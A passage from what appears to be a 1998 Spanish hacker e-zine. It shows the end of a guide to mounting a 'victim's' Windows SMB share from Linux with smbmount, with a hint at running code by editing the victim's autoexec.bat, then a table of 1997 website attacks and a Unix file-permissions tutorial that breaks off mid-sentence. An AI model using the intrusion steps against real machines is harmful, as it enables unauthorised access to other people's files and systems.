        Bueno nada mas... feliz intrusiones en WINDOWS que eso me satisface
  muy MUCHO.

    
  4. Facilidades a la hora de accder a los datos ;) (extra! extra!)


        Bueno muchos seguro que habran dicho que esto de hacer algo asin como
  un FTP es como un palo en los ojos... pues la verdad es que si. Que podemos
  hacer en Linux para que al conectarnos a un servicio (un directorio
  concretamente) podamos acceder a el como cuando lo hacemos desde el
  "ventanas" que el acceso es directo tal como si se tratase de un recurso
  nuestro?. No es dificil pero si chungo...X"D esto es, que si estas
  familiarizado un poco con linux no es dificil, lo cual es chungo, y si no
  lo estais entonces si que es chungoooooooo!!! . Bueno pero no es para tanto,
  solo hay que recompilar el kernel, si no controlais eso os podeis mirar el
  KERNEL HOWTO y luego seguid las instrucciones.
    
        Bueno para hacer lo que comentaba de conectarse a un recurso
  compartido y acceder a el como si fuera un directorio vuestro solo tendreis
  que montar dicho recurso en un directorio vuestro. La gracia, a quien le
  haga por que a mi no ;), es que por supuesto el mount raso no da
  opciones remotas, para eso hemos de usar el "smbmount" y "smbumount".
  Estas dos utilidades por si no las has metido de base cuando instalaste
  tu linux (probablemente vendran con las opciones de conectividad con
  windows) las puedes encontrar en un paquete llamado smbfs.

        Una vez las tienes metidas puedes recompilar el kernel. Lo unico que
  has de hacer es ir a las opciones de "Filesystem" y ... :

    <*> DOS FAT fs support                  
    <*> MSDOS fs support                                           
    < > VFAT (Windows-95) fs support                               
    < > umsdos: Unix like fs on top of std MSDOS FAT fs            
    [*] /proc filesystem support                                   
    <*> NFS filesystem support                                     
    [ ]    Root file system on NFS                                 
    <*> SMB filesystem support (to mount WfW shares etc..)         
    [*] SMB Win95 bug work-around                                  
        .  Asegurate que estas ^ dos ultimas esten activas 
        .
        .

  Bueno a recompilar....

        Una vez listo esto solo has de reiniciar la maquina ( no te olvides de
  lilo por si algo ). Una vez listo todo conectamos y yasta.
  Ahora solo has de seleccionar una directorio que te guste por ejemplo:
              
    mkdir /mnt/samba
 
  y para montar el directorio de la maquina remota en el :

    smbmount //VICTIMA/RECURSO /mnt/samba -I <ip/dns de la victima>

        y voila!!  te pedira password igual que en smbclient y por lo demas
  igual....

        Ahora si quieres ver lo que hay en ese directorio solo has de ir a el
  cd /mnt/samba y considerar dichos archivos como si se trataran de unos
  archivos que tienes localmente en ese directorio, con lo que seguro que 
  podreis leerlos y copiarlos pero el modificarlos depende de la forma de 
  compartir archivos de la maquina en cuestion (ya sea solo lectura o
  acceso total). 

        Nada mas respecto a este tema, lo demas corre de vuestra cuenta, tened
  en cuenta que si os comparten el directorio raiz teneis acceso al
  autoexec.bat , etc... con lo que ejecutar algo es cuestion de .. jeje
  insertar lineas y hacer reiniciar al individuo... ;) .
      
    
        Bueno este ha sido mi primer DoC, asi que ruego un poco de compasion y
  no me destroceis con KRITICAS DESTRUCTICAS... lo demas lo acepto todo,
  espero que ayude en algo y ala si necesitais alguna aclaracion, podeis
  buscadme por HISPANO como "Enif" o como "TuRBo" (from Oioio of course ;) ),
  suelo esta por #hack_novatos con el "populacho" o por #hackers ... Si sois
  de #rejoin supongo que no os costara ;-)
    
    
    ****         Engendrado por Enif from Oioio                      ****
    ****   Colaboradores  dAEk DrSlump CoSMiC SID 6.7                ****
    ****                  Saludos   a :                              ****
    ****                                                             ****
    ****     aRUsHa, ACID-BURN, KRIS, BINARIA, Nad|a                 ****
    ****     Segarra, Dillet, Marauder, Erfollaor, Sanity            **** 
    ****     Guss, Dcard, Jupiter, TGILITO, Nobody, PandE            ****
    ****     Case, Koji, N|a, Shara, Scorpia....                     ****
    ****           y en general a los canales:                       ****
    ****        #rejoin #hack_novatos y #hackers                     ****
    ****             Viva Linux!!!  Viva!!!                          ****
    
        pido disculpas por adelantado si algun nick no esta reflejado tal cual
  el autor hubiera deseado, pero eso tiene solucion rapida ;))  ...
  enif@ThePentagon.com
    
    
        Por ultimo una cosilla que le lei el otro dia a un colega que me
  permitira que se lo copie ligeramente ;-)  ...... (   ;) Marauder )

       " Las faltas de ortografia se las dedico a mi profe de Lengua de
         Bachiller y a mi pApIS. "
    
        Este DoC es de libre distribucion, puedes pasarselo a quien quieras y 
  ponerlo en las guebs que quieras, tienes mi vendicion para ello ;-)  
  No me hago responsable de lo que hagas despues de leer esto, tus actos 
  son los causantes no el conocimiento, en nigun sitio te he obligado ha
  usar lo aqui expuesto asin que vive , se feliz y dejame en mi paz
  pacifica.......... Ciao


   By Enif. 1998  ..... El Buen hacker. Consultas en : rejoin@coollist.com         

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                          /------------------------\
                         ³    ESTADISTICA DE LOS    ³
                          \    HACKERS EN 1997.    /
                            \____________________ /


        En este articulo es revelaremos la estadistica sobre los ataques
  que efectuaron los Hackers por Internet en 1997, los cuales fueron muy
  diversos.

  Aqui tenemos una tabla la cual refleja los 12 meses del a¤o (horizontal) y 
  abajo los dominios hackeados (vertical). Como podreis observar el dominio
  .COM o sea Comercial es el mas afectado de todos, seguido de .ORG
  (organizacion) pero en menor medida, con mucha diferencia.

  <---------------------- TABLA DE ESTADISTICA ----------------------------->

  MES        EN   FE   MA   AB   MA   JU   JU   AG   SE   OC   NO   DI  TOTAL
  DOMINIO
      .COM   -     -   1    -    3    6    2    7    32   28   59   82  220
      .ORG   -     -   1    1    -    -    1    2    -    3    4    6   18
      .NET   -     -   -    -    -    -    2    2    2    3    6    1   16
      .EDU   -     -   -    -    -    -    -    2    1    1    2    3   9
      .GOV   -     -   1    -    -    1    -    -    1    -    1    2   6
      .MIL   -     -   -    -    -    -    -    -    -    2    -    2   4
      .US    -     -   -    -    -    -    2    -    1    -    3    1   7
      .JP    -     -   -    -    1    -    -    -    1    2    3    -   7
      .UK    -     -   -    1    -    -    -    -    1    -    1    3   6
      .SE    -     -   -    3    1    -    -    -    -    -    -    1   5
      .ID    -     -   -    1    -    -    -    -    -    -    -    -   1
      .IT    -     -   -    -    1    -    -    -    -    -    -    2   3
      .PL    -     -   -    -    1    -    -    -    -    -    -    1   2
      .KR    -     -   -    -    -    -    1    -    -    -    -    -   1
      .CA    -     -   -    -    -    -    1    -    -    2    -    2   5
       OTROS -     -   -    -    -    -    -    2    2    3    3    8   17
  TOTAL      -     -   3    6    7    7    9    15   41   44   82   112 326

  Otros Dominios: .NL, .RO, .ES, .NO, .ZA, .AT, .CN, .IR, .AU, .CZ, .MX,
                  .MY, .TW

  La estadistica a sido realizada en base a las siguientes reglas:

  - Todos los ataques fueron verificados.
  - Multiples ataques fueron contados.
  - Entre Enero y Febrero de 1997 no hubo estadistica, por eso no hay numeros.
  - Estos sitios aumentaron el trafico y su popularidad el a¤o pasado, por lo
    que engordaron el total.
  - Los comercios On-Line atacados no han sido incluidos.
  - Esta estadistica no es un estudio cientifico como tal.

  Nota : Datos obtenidos en Hacked Net.

                                                   - J.J.F. / HACKERS TEAM -

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

 [DOCUMENTO SOBRE LOS PERMISOS DE ARCHIVOS Y DIRECTORIOS PARA SISTEMAS UNIX]
==============================================================================

  1. Introduccion
  ---------------
        El siguiente documento tratara de explicar en que consiste y como
  podemos establecer los diferentes permisos que podemos atribuir tanto a
  directorios como a archivos en sistemas UNIX.
        Si eres un usuario avanzado en el terreno UNIX, esto ya deberias
  saberlo, pero si aun asi deseas leerlo te agradeceria a ti y a todos los
  demas, que me rectificarais cualquier fallo que pueda tener durante este
  texto.

  2. Comenzando
  -------------
        Como todos sabreis los sistemas UNIX son sistemas
  multitarea/multiusuario. A diferencia del sistema operativo MSDOS (por
  ejemplo), estos sistemas operativos tienen la capacidad de tener a mas de
  un usuario dentro del sistema, tanto localmente como remotamente. Por lo
  tanto para proteger la privacidad de los archivos y directorios de cada uno
  de ellos, para proteger ciertos archivos elementales para el buen
  funcionamiento de la maquina, y para una buena organizacion del sistema
  (aparte de otras muchas razones), tenemos a nuestra disposicion los
  llamados permisos.
        Como ya sabras, en una computadora con el S.O MSDOS, cualquier
  persona que acceda a ella puede en cualquier momento borrar todo el disco
  duro. En los sistemas UNIX hay diferentes categorias de usuarios, siendo la
  mas alta la del llamado 'root', o superusuario, que puede leer, escribir y
  ejecutar en cualquier archivo dentro del sistema.
        Como he citado antes, hay 3 posiblidades a la hora de 'tratar' a un
  archivo. Leer el archivo, ejecutar el archivo y escribir en el archivo (por
  supuesto, nada de esto podremos hacer si no tenemos permiso para ello o no
  hemos establecido los permisos oportunos).

  3. UIDs y GIDs 
  --------------
        Toda persona que haya tenido la oportunidad de trabajar con un sistema
  UNIX, si ha tenido la ocasion de observar el archivos de paswords, habra
  visto que aparte de la informacion del usuario, login, definicion de
  shell... se encuentran 2 numeros, para ser mas exactos, en el tercer y
  cuarto campo.
        El tercero UID, y el cuarto, tambien definido en /etc/group GID. Todo
  esto a grosos modos, serviria para identificar a cada archivo con su
  propietario y grupo, entre otras cosas.
        Los permisos de los archivos se almacenan junto con otra informacion
  en una palabra de 16 bits dentro de lo llamado 'i-node'. 9 de ellos, se
  refieren a lo mencionado anteriormente (lectura, escritura y ejecucion),
  ademas de 3 bits adicionales que contienen cierta informacion para las
  operaciones con el archivo si es ejecutable, que ya explicaremos mas
  adelante. Cada archivo posee un'i-node' diferente, que ademas de contener
  todo lo que hemos citado anteriormente, este numero tambien hace referencia
  a los X primeros bloques en el disco donde se encuentra ese fichero, y
  vienen las referencias de los bloques que contienen las direcciones simples,
  dobles y triples del resto de los bloques del fichero, ademas de muchas
  otras cosas que no tratamos en este documento.
        
        *NOTA* Si deseamos saber el numero 'i-node' de un archivo en concreto
  podemos emplear el comando 'ls -i archivo'

  4. Permisos
  -----------
        En los archivos, o ficheros UNIX, a la hora de establecer los permisos
  deseados tenemos que hacer uso de una orden de este S.O, que ha sido
  destinada para eso exactamente, para la especificacion de permisos, esta
  orden se llama 'chmod'. A la hora de establecer los permisos, tenemos dos
  posiblidades, las dos son igual de validas y buenas, aunque cada uno
  siempre se habituara a la que le resulte mas comoda. Las dos posiblidades
  citadas anteriormente reciben el nombre de absoluta y relativa, que mas
  adelante hablaremos sobre ellas.
        A continuacion explicaremos las caracteristicas globales que tienen
  los permisos de los archivos tanto hayan sido asignados en forma abosluta
  como relativa.

  Fijate en los siguientes cuadros:

  Fig 1.
         -rwxrwxrwx   1 core     users           5 Feb  4 21:49 prueba*


  Fig 2.                 Permiso
                    -----------------    
                    r |  lectura
                    w |  escritura   
                    x |  ejecucion   

        Gracias al comando 'ls -l' podemos obtener bastante informacion tanto
  de los archivos como de los directorios del sistema UNIX, tras hacer un
  ls -l prueba el sistema nos mostrara algo parecido a la Figura 1.
        Que como podemos observar el usuario 'core' del grupo 'users' tiene
  un archivo llamado 'prueba'. Si observamos el primer fragmento de la linea,
  nos extra¤ara el ver repetidamente las letras r,w y x, ademas del '-' al
  principio de todo. Pues bien como hemos citado antes, un S.O basado en UNIX
  tiene diferentes categorias de usuarios, es por ello que en el archivo
  'prueba' y en todos los archivos, se engloban todos estos grupos.
        El primer '-' significa que es un archivo normal, ya que si fuese un
  directorio dicho '-' nos lo representaria por 'd', si fuese un enlace
  mediante 'l', 'b' significaria que es un dispositivo especial de bloques,
  'c' un dispositivo especial de caracteres,'p' un archivo de conduccion por
  nombre, 's' un semaforo y 'm' nos indicaria que es un archivo de memoria
  compartida.
        Las 3 primeras letras 'rwx' si os fijais en la Fig 2 sabreis que se
  refiere tanto a permisos de lectura, escritura y ejecucion, pero este
  primer terceto siempre se referira al usuario que creo dicho archivo, es
  decir al usuario 'core', por lo tanto sabemos que este usuario puede leer,
  escribir y ejecutar dicho fichero. Pero... que hay del resto? Pues bien, el
  segundo terceto siempre se referira a los permisos del grupo, mientras que
  lo que resta a los demas usuarios. Por lo tanto en este caso, como habreis
  deducido, todo el mundo tiene derecho a todos los permisos posibles sobre
  el archivo. Pongamos un ultimo ejemplo:

        -r-x--xrw-   1 core     users           5 Feb  4 21:49 prueba*

        En este fichero como podreis observar hay un ligero cambio de
  permisos. El fichero 'prueba' ya que comienza mediante un '-' tiene permisos
  de lectura y ejecucion para su due¤o 'core', de ejecucion para los de su
  grupo 'users', y de lectura y escritura para el resto de usuarios. Como
  habreis podido ver, al no haber permisos de escritura para su due¤o, ni
  permisos de lectura y escritura para su grupo, ni permisos de ejecucion
  para el resto de los usuarios, estos son resprentados mediante un '-'.
 
        Ahora que ya hemos explicado las caracteristicas globales de todo
  directorio y archivo unix podemos dar paso a la explanacion de las 2 formas
  citadas anteriormente para establecer nuestros permisos en el sistema UNIX.

  Forma abosluta:

        La principal caracteristica que tiene esta nomenclatura es la de
  asignar los permisos mediante valores octales.
        Como todos sabreis, la base octal, o base 8, puede contener de los
  numeros 0 al 7. Es por ello, que tan solo son validos estos numeros a la
  hora de asignar permisos. Fijate en el siguiente cuadro:

  Fig 1.                Permiso    Valor_Octal
                   ------------------------------
                   r |  lectura         4
                   w |  escritura       2
                   x |  ejecucion       1

        Claramente observamos que numero octal corresponde a cada
  caracteristica de un archivo o directorio en un sistema UNIX. Pasemos pues
  a poner en uso todo lo aprendido hasta ahora.
        Como dijimos antes el comando utilizado por los S.O UNIX para
  establecer permisos recibe el nombre de chmod. A la hora de dar permisos en
  forma absoluta hemos de seguir la siguiente Sintaxis: 'chmod XYZ archivo'.
        X representa al due¤o del archivo, Y al grupo y Z al resto de
  usuarios, mientras que 'archivo' es el nombre del archivo a especificar los
  permisos. Siempre que queramos atribuir mas de un permiso los numeros
  octales se sumaran. Observar los siguientes ejemplos para un mayor
  entendimiento:

                chmod 460 archivo   
                chmod 755 archivo
                chmod 050 archivo
                chmod 000 archivo
                chmod 777 archivo

        -EL primer ejemplo daria permisos de lectura al propietario (4),
  lectura y escritura al grupo (4+2), y ningun permiso al resto de usuarios
  (0).
        -El segundo ejemplo daria permisos de escritura, lectura y ejecucion
  al propietario (4+2+1), permisos de lectura y ejecucion tanto al grupo como
  al resto de usuarios (4+1)
        -El tercer ejemplo no daria ningun permiso al propietario (0),
  permisos de ejecucion y lectura al grupo (4+1), y ningun permiso al resto
  de usuarios (0)
        -El cuarto ejemplo no tendria ningun permiso para nadie (0)
        -Y finalmente el ultimo ejemplo tendria todos los permisos para todos
  los usuarios (4+2+1) 

        Espero que haya quedado totalmente claro el sistema absoluto mediante
  los anteriores ejemplos. Una vez dicho esto pasemos a explicar la segunda y
  ultima posiblidad.

  Forma relativa:

        A diferencia de la forma abosulta, la relativa no utiliza numeros
  octales o en base 8 para establecer los diferentes permisos, sino que se
  basa en una nomenclatura de letras. Al igual que en la forma absoluta, en
  la relativa tambien nos valemos del comando 'chmod' para asignar los
  permisos.

  Observa los siguientes cuadros:

  Fig 1.

  Letra             Explicacion
  ---------------------------------------------------------------------------
    a           Engloba todos los usuarios, grupos y demas usuarios.   
    g           Engloba el grupo del propietario.
    o           Engloba todos los demas usuarios no mecionados antes.
    u           Engloba al usuario que creo dicho archivo                    
         
  Fig 2.

  Operador           Explicacion
  ---------------------------------------------------------------------------
    +            Agrega la modalidad
    -            Elimina la modalidad
    =            Elimina los permisos existentes y agrega los establecidos
                 que indiquemos.

  Fig 3.

  Permiso             Explicacion
  ---------------------------------------------------------------------------
    x            Establecemos la ejecucion
    r            Establecemos la lectura
    w            Establecemos la escritura

        Siempre que queramos atribuir permisos a un archivo/directorio en
  forma relativa seguiremos por orden los 3 cuadros expuestos anteriormente.
  Por lo tanto primero se indicara a la persona o personas que queremos
  atribuir dichos permisos, seguiremos estableciendo la agregacion o
  eliminacion de ciertos permisos y finalmente indicaremos estos mismos
  permisos. Fijate en el siguiente ejemplo:

         chmod a+r archivo

        Si te has fijado en las Figuras anteriores, no te deberia costar
  demasiado entender los permisos que atribuye la orden anterior.
  Primeramente como hemos dicho, indicamos al usuario/usuarios, en este caso
  esta la letra 'a' que significa que estableceremos permisos al due¤o, grupo
  y demas usuarios. El siguiente simbolo que le sigue, indicara si queremos
  agregar o eliminar permisos del archivo en cuestion, en este caso el
  simbolo '+' indica que queremos agregar permisos al fichero. Finalmente
  indicaremos los permisos a agregar. En este caso indicamos 'r' (lectura)
  para todos los usuarios 'a'.
        Espero que haya quedado claro lo anterior, mediante este ejemplo. Sin
  embargo quiza el simbolo '=' no lo acabemos de entender. Bien simplemente a
  diferencia de los caracters '+' y '-', el simbolo '=' lo que hace es
  agregar permisos al usuario/usuarios en cuestion, pero eliminando antes los
  que tenia establecidos. Ejemplo:

          chmod g=rw archivo

        Y simplemente lo que haria seria quitar los permisos establecidos en
  el grupo (si hay alguno), y daria permisos de lectura 'r' y escritura 'w'
  al grupo del creador de dicho archivo.

        Si por el contrario queremos establecer varios permisos a las
  diferentes categorias que comprenden los sistemas UNIX podemos utilizar
  las comas.
  Ejemplo:

          chmod o-wr, g-wr archivo

        Que simplemente esta sentencia eliminaria ambos permisos, de escritura
  y lectura tanto para el grupo, como para el resto de usuarios o general.

        Durante gran parte de este texto, nos hemos referido tanto a
  directorios como a archivos de forma indistintiva. Pero como bien sabemos,
  un directorio con caracteristicas de ejecucion, no quiere decir que se
  pueda ejecutar, entre otras cosas, porque los directorios no se crearon con
  ese fin. A continuacion se muestra un cuadro con las multiples cualidades
  que puede tener un directorio, y que podemos hacer con funcion de estas.
 
  Fig 1.

      Permisos            Caracteristicas
  --------------------------------------------------------------------
        r           La persona o personas que tenga establecidos este permiso
                    podran observar lo que contiene dicho directorio.

        w           La persona o personas que tenga establecidos este permiso
                    podran escribir (crear o eliminar) en el directorio.
                   
        x           La persona o personas que tenga establecidos este permiso
                    podran acceder al directorio y ejecutar los archivos
                    que lo contienen, siempre y cuando estos tengan permisos
                    de ejecucion a su vez.

        Como habreis podido deducir, las opciones anteriores se pueden
  convinar si deseamos dar multiples cualidades a un directorio.

        A continuacion podras ver unas aclaraciones tanto de archivos como de 
  directorios que no habiamos comentado literalmente hasta ahora.

        *Las unicas personas que pueden cambiar el permiso de los archivos o
  directorios ubicado en una maquina UNIX son: el propietario del archivo
  o directorio, el root o superusuario del sistema, y el due¤o del directorio
  en el cual contiene dicho fichero o directorio. 

        *Siempre que un usuario tenga propiedad de lectura (como minimo)
  sobre cualquier archivo, y este no sea el propietario, si copia dicho
  fichero, la duplicacion de este archivo pasara a ser propiedad de el.

        *Cuando hablamos sobre permisos de escritura de archivos, nos
  referimos a la posiblidad que tenemos de insertar o eliminar texto dentro
  de ese fichero, mientras que cuando nos referimos a estos ultimos permisos
  para directorios, tenemos la posiblidad de crear nuevos archivos o
  directorios ubicados dentro del directorio en el cual tenemos estos
  permisos.

        *A la hora de eliminar un archivo o un directorio, no importa los
  permisos que tengan, ni quien sea su propietario, mientras tengamos
  permisos de escritura sobre el directorio que se encuentra dicho fichero o
  directorio podremos borrarlo.

        Finalicemos este apartado dando un repaso sobre los diversos
  parametros que podemos conjuntar con el comando chmod a la hora de
  establecer permisos.

  Sintaxis general:

        chmod [opciones] establecimiento_del_permiso archivo_o_directorio

  Opciones                     Descripcion
  --------                     -----------
  -c         *Nos describe con detalle solo los archivos cuyos permisos
              cambian. Si volvemos a establecer los mismos que tenia, el
              sistema no mostrara nada.

  -f         *Si usamos esta opcion, y establecemos un permiso a un archivo
              en el que no somos propietarios, el sistema no sacara ningun
              tipo de error, simplemente el archivo se quedara tal como
              estaba antes.

  -v         *Describe con detalle los permisos cambiados, aunque volvamos a
              establecer los mismos, el sistema nos lo indicara.

  -R         *Esta opcion cambia de forma recursiva los permisos de los
              directorios y todo lo que haya dentro.

  --help     *Muestra como usar chmod con sus respectivos parametros

  --version  *Imprime informacion de la version chmod utilizado por nuestro
              S.O

        Si te interesa concretar mas a cerca de este comando con todas sus
  opciones posibles, puedes consultar la ayuda de UNIX (man chmod)

  5. Los 3 bits adicionales de los permisos de un archivo
  --------------------------------------------------------
        En la seccion 3, si recordais, dejemos un tema en el aire, en el cual
  se hablaba de 3 bits adicionales que proporcionaban informacion para las
  operaciones del archivo mientras fuese ejecutable. Este tema es el que
  abarcaremos en esta seccion.

        Hasta ahora hemos aprendido a dar 3 cualidades diferentes a un archivo
  o directorio. Y a estas alturas nos resulta ya familiar las letras 'r', 'w',
  y 'x'. Pero los sistema basados en UNIX nos permiten dar un ligero cambio
  a la estructura ya explicada anteriormente mediante estos 3 bits
  adicionales. Son los llamados: setgid, setuid, y el bit sticky.

        Gracias a estas opciones podemos de alguna manera 'romper' las normas
  que hemos establecido hasta ahora. Si recordais, hemos explicado que si un
  archivo fuese del tipo -rwxrwxrwx, es decir que tuviese todos los permisos
  posibles para todos los usuarios posibles, cualquier usuario podria
  borrarlo por ejemplo. En este caso, si a este mismo archivo le agregaramos
  el permiso del bit sticky, este archivo solo podria ser borrado por el
  propietario del archivo, el propietario del directorio y el root. veamos
  la representacion:

  Fig 1.

  -rwxrwxrwx   1 core     users           5 Feb  5 16:50 prueba*

  Fig 2.

  -rwxrwxrwt   1 core     users           5 Feb  5 17:56 prueba*

        Como podreis observar hay un ligero cambio en los permisos del
  archivo, ademas del caracter 't' que aun no conociamos (sticky o adosado)
  En este caso como hemos dicho la Fig 2. representa un archivo que solo
  puede ser borrado por el root, dueño del directorio donde se ubica, y por
  el creador de dicho archivo. Sin embargo en este segundo caso, cualquier
  persona puede escribir, leer, y ejecutar el fichero prueba, pero nunca
  borrar. Ademas de todo esto, el bit sticky tambien se usa para que no se
  retire dicho archivo del espacio swap hasta que el programa haya finalizado.
  Tambien se ha de resaltar, que siempre que se vea el simbolo 't' significara
  que el bit sticky esta a uno (por lo tanto activado) y el bit de ejecucion
  tambien a uno (por lo tanto el archivo podra ser ejecutado). Pero tambien
  cabe la posiblidad de encontrarnos delante del simbolo 'T' que nos indicara
  que el bit sticky esta a uno, pero el bit de ejecucion esta a 0.

        El establecimiento de este permiso es sumamente sencillo. Hasta ahora
  solo conociamos la sintaxis chmod XYZ, a partir de ahora agregamos una nueva
  variable, en este caso quedaria asi, chmod KXYZ, siendo K el valor que
  daremos para establecer tanto el bit sticky, como el setuid o setgid que
  explicaremos mas adelante.
        Para establecer el bit adosado en un archivo, deberemos darle el valor
  de 1 a la variable K. Ejemplo:

       chmod 1000 prueba         

    ---------T   1  core    users           7 Feb  5 18:00 prueba

        Como podemos observar el bit sticky esta a 1, pero el bit de ejecucion
  esta a 0, por lo tanto se representara mediante 'T'. Para la forma relativa
  el establecimiento seria colocando la letra 't'. Ejemplo:

       chmod a=t prueba

  Obteniendo los mismos resultados.
  Si tubieramos el formato -rw-rw---x al poner el bit sticky a 1 obtendriamos:

    -rw-rw---t   1 core    users           7 Feb  5 18:00 prueba*

        NOTA: Si habeis sido un poco observadores, os habreis dado cuenta de
  que si activamos el bit adosado, este no nos deja ver si el resto de
  usuarios tiene permisos de ejecucion. Siempre que el simbolo lo represente
  mediante 't' sabremos que el resto de usuarios tiene permisos de ejecucion.
  Y si lo representa mediante 'T', el resto de usuarios no los tendra.

        Una vez explicado todo esto, podemos pasar a explicar el
  funcionamiento del bit setuid y setgid.
        El bit setuid estara activado y representado en los permisos del
  due¤o del archivo. De tal forma que si el setgid esta activado, estara
  representado en los permisos del grupo.
        Si el bit esta activado en el primer terceto de permisos (setuid)
  y es ejecutado por un usuario, el fichero en concreto, a partir de ese
  momento actuara de la misma forma, que actuaria si fuese ejecutado por el 
  propio due¤o del fichero. De esta misma forma si el bit esta activado
  en el campo del grupo (setgid), y lo ejecuta un usuario del tercer tercerto
  de permisos, este inmediatamente actuara como si fuese del grupo de ese
  fichero.

        Igual que antes, siempre que veamos el simbolo 's', en este caso,
  significara dependiendo de donde se encuentre, que el bit setuid, o setgid
  esta a 1, y el bit de ejecucion tambien a 1. Si se representa mediante 'S'
  el bit de ejecucion estara a 0. Puesto que estos permisos consisten en
  ejecutar archivos con permisos diferentes, debera de darse permisos de
  ejecucion tanto al dueño, como al grupo y resto de usuarios, ya que si el
  bit setuid o setgid esta activado, quedra decir que queremos que lo
  ejecuten otros usuarios, por lo tanto no tendria sentido quitar el permiso
  de ejecucion de los campos.

        Estos bits siguen la misma nomenclatura que el ya tratado bit sticky.
  Si deseamos aplicarlo de la forma absoluta, bastara con darle al valor
  K el numero 4, con ello activaremos el bit setuid a 1. En cambio si le damos
  a K el valor 2, activaremos el setgid. De igual forma que anteriormente,
  tanto el bit sticky, como setuid o setgid, sus valores se pueden sumar. Si 
  desearamos dar permisos a un archivo con el bit sticky, setgid y setuid 
  activados, ademas de dar permisos de ejecucion a todo el mundo, bastaria 
  con hacer un ' chmod 7111 archivo '.
        Si optaramos por la forma relativa, tenemos a nuestra disposicion la
  letra 's'para dar dichos permisos. Ejemplo:

       chmod g=s archivo

        Con esta instruccion quitariamos todos los permisos antiguos del grupo
  (si los hubiera) y activaria el bit setgid, ya que estamos 'tocando' el
  campo del grupo, y en ese campo no puede estar el bit setuid.

        A continuacion mostramos 4 ejemplos de lo hablado hasta ahora, para
  poder observar la diferencia de lo aprendido hasta el momento. 
        El primero representa un archivo ejecutable con el bit setuid a 1, y
  ejecutable. El 2 ejemplo representa lo anterior pero sin permisos  de
  ejecucion ni de ningun tipo. El 3 representa un archivo con permisos de
  ejecucion y bit setgid activado. Y por ultimo un archivo sin permisos con
  setgid activado y permisos de ejecucion desactivados.

  Fig 1.

  ---s--x--x   1 core     users           5 Feb  5 19:26 prueba*

  Fig 2.

  ---S------   1 core     users           5 Feb  5 19:26 prueba

  Fig 3.

  ---x--s--x   1 core     users           5 Feb  5 19:26 prueba*

  Fig 4.

  ------S---   1 core     users           5 Feb  5 19:26 prueba

        Uno de los archivos mas claros en los sistemas UNIX, que necesita
  tener especificado el permiso setuid, es el nombrado /usr/bin/passwd que
  permite a cualquier usuario cambiar su pasword o palabra clave, ya que para
  sobreescribir su nueva clave en el fichero /etc/passwd se ha de tener
  permisos de escritura. Si deseais obtener mas informacion sobre que
  archivos o directorios tienen establecidos tanto el bit adosado, bit
  setuid o setgid nos podemos ayudar con las ordenes 'find -perm 1000 -print'
  'find -perm 4000 -print' y 'find -perm 2000 -print' respectivamente.

        Tambien uno de los ejemplos mas claros a aplicar para el bit sticky,
  es el del directorio /tmp ya que todo el mundo tiene cualquier permiso sobre
  ese directorio, sino estuviera dicho bit activado, cualquier usuario
  podria borrar archivos que no pertenecieran a el.

  6. chown, chgrp y umask
  ------------------------
        No podiamos despedirnos de este documento sin almenos hacer mencion de
  3 comandos que tambien tienen mucho que ver con los permisos de todo
  directorio o archivo UNIX. A continuacion pasamos a explicarlos:

  Chown:

        Gracias a esta orden nos es permisible cambiar la propiedad del
  archivo, es decir 'entregar' un archivo de nuestra propiedad a otra persona,
  con lo cual esta ultima persona sera el nuevo propietario de dicho fichero.
        Es importante saber que la propiedad de cualquier fichero solo puede
  cambiarla el root o superusuario del sistema.

  Podemos utilizar esta orden de la siguiente forma:

                         chown nuevo_usuario fichero

  Ejemplo:

  ls -l

     -rw-rw---t   1 core    users           7 Feb  5 18:00 prueba*

  chown temp prueba

  ls -l

     -rw-rw---t   1 temp    users           7 Feb  5 18:20 prueba*

        Como se puede apreciar claramente, el superusuario del sistema a
  cambiado la propiedad del archivo 'prueba' que antes pertenecia al usuario
  'core' y lo ha establecido de forma que el nuevo due¤o del fichero es el
  usuario temp.

        De igual forma que en la orden chmod, chown tambien posee diversos
  parametros que se pueden aplicar cojuntamente con esta orden, a continuacion
  los describimos:

  Sintaxis general:

     chown [opciones] establecimiento_del_nuevo_usuario archivo_o_directorio

  Opciones                     Descripcion
  --------                     -----------
  -c         *Nos describe con detalle solo los archivos cuya propiedad
              cambian. Si volvemos a establecer la propiedad que ya tenia, el
              sistema no mostrara nada.

  -f         *Esta opcion no imprime mensaje de error alguno sobre archivos
              cuya propiedad no pueden cambiarse.
            
  -v         *Describe con detalle los permisos de propiedad, aunque volvamos
              a establecer los mismos, el sistema nos lo indicara.

  -R         *Esta opcion cambia de forma recursiva la propiedad de los
              directorios y todo lo que haya dentro.

  --help     *Muestra como usar chown con sus respectivos parametros

  --version  *Imprime informacion de la version chown utilizado por nuestro
              S.O

        Si te interesa concretar mas a cerca de este comando con todas sus
